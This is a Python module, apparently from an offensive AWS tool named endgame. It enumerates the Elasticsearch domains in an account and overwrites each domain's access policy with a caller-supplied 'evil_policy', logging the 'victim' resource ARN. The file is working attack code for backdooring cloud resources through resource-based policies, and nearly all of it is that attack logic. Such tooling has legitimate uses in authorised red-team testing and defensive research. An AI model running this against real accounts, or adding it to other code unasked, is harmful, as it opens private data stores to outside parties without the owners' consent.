import sys
import logging
import json
import boto3
import botocore
from abc import ABC
from botocore.exceptions import ClientError
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.list_resources_response import ListResourcesResponse
from endgame.shared.response_message import ResponseMessage

logger = logging.getLogger(__name__)


class ElasticSearchDomain(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        service = "es"
        resource_type = "domain"
        super().__init__(name, resource_type, service, region, client, current_account_id)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}/{self.name}"

    def _get_rbp(self) -> PolicyDocument:
        """Get the resource based policy for this resource and store it"""
        try:
            # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/ses.html#SES.Client.list_identity_policies
            response = self.client.describe_elasticsearch_domain_config(DomainName=self.name)
            domain_config = response.get("DomainConfig")
            policy = domain_config.get("AccessPolicies").get("Options")
            policy = json.loads(policy)
        except botocore.exceptions.ClientError:
            # When there is no policy, let's return an empty policy to avoid breaking things
            policy = constants.get_empty_policy()
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        return policy_document

    def set_rbp(self, evil_policy: dict) -> ResponseMessage:
        new_policy = json.dumps(evil_policy)
        try:
            # https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/es.html#ElasticsearchService.Client.update_elasticsearch_domain_config
            self.client.update_elasticsearch_domain_config(DomainName=self.name, AccessPolicies=new_policy)
            message = "success"
        except botocore.exceptions.ClientError as error:
            message = str(error)
        response_message = ResponseMessage(message=message, operation="set_rbp", evil_principal="",
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=evil_policy, resource_type=self.resource_type,
                                           resource_name=self.name, service=self.service)
        return response_message


class ElasticSearchDomains(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "elasticsearch"
        self.resource_type = "domain"

    @property
    def resources(self) -> list[ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []

        response = self.client.list_domain_names()
        if response.get("DomainNames"):
            for domain_name in response.get("DomainNames"):
                name = domain_name.get("DomainName")
                arn = f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}/{name}"
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=name)
                # resources.append(domain_name.get("DomainName"))
                resources.append(list_resources_response)
        return resources
